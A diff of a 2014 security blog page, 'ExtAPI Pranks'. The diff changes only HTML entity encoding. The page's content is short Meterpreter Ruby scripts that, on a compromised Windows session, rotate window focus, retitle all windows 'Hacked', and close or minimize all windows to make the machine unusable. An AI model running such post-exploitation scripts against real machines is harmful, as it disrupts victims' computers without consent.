@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Since I&#39;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&amp;lsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
+<meta name="description" content="Since I&amp;rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&amp;lsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
 Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
@@ -32,7 +32,7 @@ Just brushing the surface and to help people see the power of this new functiona
 
 
 <meta itemprop="name" content="ExtAPI Pranks">
-<meta itemprop="description" content="Since I&#39;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&lsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
+<meta itemprop="description" content="Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&lsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
 Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.">
 <meta itemprop="datePublished" content="2014-01-10T01:21:45-05:00" />
 <meta itemprop="dateModified" content="2014-01-10T01:21:45-05:00" />
@@ -42,7 +42,7 @@ Just brushing the surface and to help people see the power of this new functiona
 
 <meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ExtAPI Pranks"/>
-<meta name="twitter:description" content="Since I&#39;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&lsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
+<meta name="twitter:description" content="Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&lsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
 Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone."/>
 
 
@@ -116,7 +116,7 @@ Just brushing the surface and to help people see the power of this new functiona
             
 
             <div class="post-content">
-                <p>Since I've been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find <a href="https://twitter.com/TheColonial">OJ</a>&lsquo;s write up on it and more amazing things he did in <a href="http://buffered.io/posts/3-months-of-meterpreter/">3 months of meterpreter</a> and on the <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/12/weekly-metasploit-update">Metasploit blog</a>.</p>
+                <p>Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find <a href="https://twitter.com/TheColonial">OJ</a>&lsquo;s write up on it and more amazing things he did in <a href="http://buffered.io/posts/3-months-of-meterpreter/">3 months of meterpreter</a> and on the <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/12/weekly-metasploit-update">Metasploit blog</a>.</p>
 <p>Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.</p>
 <p>1st is a script that loops through all of the windows for your current user and sets the focus to them in rotation. Essentially making their machine unusable.</p>
 <ul>
@@ -126,23 +126,23 @@ Just brushing the surface and to help people see the power of this new functiona
 <span style="color:#75715e"># that the current user has open and switches</span>
 <span style="color:#75715e"># focus to each of them in rotation... 100 times.</span>
  
-(<span style="color:#ae81ff">0</span><span style="color:#f92672"></span><span style="color:#f92672">..</span><span style="color:#ae81ff">100</span><span style="color:#f92672"></span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span>
+(<span style="color:#ae81ff">0</span><span style="color:#f92672">..</span><span style="color:#ae81ff">100</span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span>
 	windows <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>extapi<span style="color:#f92672">.</span>window<span style="color:#f92672">.</span>enumerate
 	windows<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>winder<span style="color:#f92672">|</span>
 		<span style="color:#66d9ef">if</span> winder<span style="color:#f92672">[</span><span style="color:#e6db74">:title</span><span style="color:#f92672">]</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;Default IME&#39;</span>
 			result <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>user32<span style="color:#f92672">.</span>SetForegroundWindow(winder<span style="color:#f92672">[</span><span style="color:#e6db74">:handle</span><span style="color:#f92672">]</span>)
 		<span style="color:#66d9ef">end</span>
 	<span style="color:#66d9ef">end</span>
-	print_status(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Round </span><span style="color:#e6db74">#{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+	print_status(<span style="color:#e6db74">&#34;Round </span><span style="color:#e6db74">#{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 <span style="color:#66d9ef">end</span>
-</code></pre></div><p>2nd just sets all of the windows title's the say &ldquo;hacked&rdquo;</p>
+</code></pre></div><p>2nd just sets all of the windows title&rsquo;s the say &ldquo;hacked&rdquo;</p>
 <ul>
 <li>Source: <a href="https://gist.github.com/mubix/8050592">https://gist.github.com/mubix/8050592</a></li>
 </ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">windows <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>extapi<span style="color:#f92672">.</span>window<span style="color:#f92672">.</span>enumerate
 windows<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>winder<span style="color:#f92672">|</span>
   <span style="color:#66d9ef">if</span> winder<span style="color:#f92672">[</span><span style="color:#e6db74">:title</span><span style="color:#f92672">]</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;Default IME&#39;</span>
-    result <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>user32<span style="color:#f92672">.</span>SetWindowTextA(winder<span style="color:#f92672">[</span><span style="color:#e6db74">:handle</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Hacked</span><span style="color:#e6db74">&#34;</span>)
+    result <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>user32<span style="color:#f92672">.</span>SetWindowTextA(winder<span style="color:#f92672">[</span><span style="color:#e6db74">:handle</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;Hacked&#34;</span>)
   <span style="color:#66d9ef">end</span>
 <span style="color:#66d9ef">end</span>
 </code></pre></div><p>and finally if in Windows if you close all of the windows, including &ldquo;invisible&rdquo; ones like Explorer, you will essentially make the machine unusable.</p>
@@ -162,7 +162,7 @@ windows<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</
 </code></pre></div><p>or Minimize all:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">windows <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>extapi<span style="color:#f92672">.</span>window<span style="color:#f92672">.</span>enumerate
 windows<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>winder<span style="color:#f92672">|</span>
-    result <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>user32<span style="color:#f92672">.</span>ShowWindow(winder<span style="color:#f92672">[</span><span style="color:#e6db74">:handle</span><span style="color:#f92672">]</span>, <span style="color:#ae81ff">6</span><span style="color:#f92672"></span>)
+    result <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>user32<span style="color:#f92672">.</span>ShowWindow(winder<span style="color:#f92672">[</span><span style="color:#e6db74">:handle</span><span style="color:#f92672">]</span>, <span style="color:#ae81ff">6</span>)
 <span style="color:#66d9ef">end</span>
 </code></pre></div><p>Thats it for now, next up we will do a few things with services as well as the clipboard. Stay tuned!</p>
 
